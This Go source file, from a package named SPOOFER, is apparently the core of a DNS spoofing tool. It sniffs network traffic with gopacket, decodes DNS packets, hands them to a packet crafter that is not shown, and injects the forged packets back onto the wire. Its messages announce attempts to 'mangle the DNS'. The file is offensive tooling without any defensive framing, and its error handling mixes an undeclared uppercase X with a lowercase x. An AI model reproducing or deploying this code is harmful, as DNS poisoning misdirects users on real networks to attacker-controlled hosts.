package SPOOFER

import (
	"fmt"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func Mangle() {
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information -> Attempting to mangle the DNS")
	fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information -> Attempting to listen for the pkt source")
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
	decoded := make([]gopacket.LayerType, 0, 4)
	src := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, x := src.NextPacket()
		x = decoder.DecodeLayers(packet.Data(), &decoded)
		if X != nil {
			fmt.Println("\033[38;5;55m|\033[38;5;31m-\033[38;5;55m| Error -> Got error when trying to decode the packet layer -> ", x)
		}
		if len(decoded) != 4 {
			continue
		}
		fmt.Print("\n\n")
		fmt.Println(packet)
		buffer := Crafter(&ethernetLayer, &ipLayer, &dnsLayer, &udpLayer)
		if buffer == nil {
			fmt.Println("\033[38;5;55m|\033[38;5;31m-\033[38;5;55m| Information -> \033[38;5;43mBuffer was empty")
			continue
		} else {
			fmt.Println("------------------------------------------------------------------")
			fmt.Println("Recieved buffer that was not empty -> ", buffer)
			fmt.Println("- END OF BUFFER --------------------------------------------------")
		}
		X = handle.WritePacketData(buffer)
		if X != nil {
			fmt.Println("\033[38;5;55m|\033[38;5;31m-\033[38;5;55m| Error -> Got error when trying to write the packet data to the buffer -> ", X)
		}
	}
}
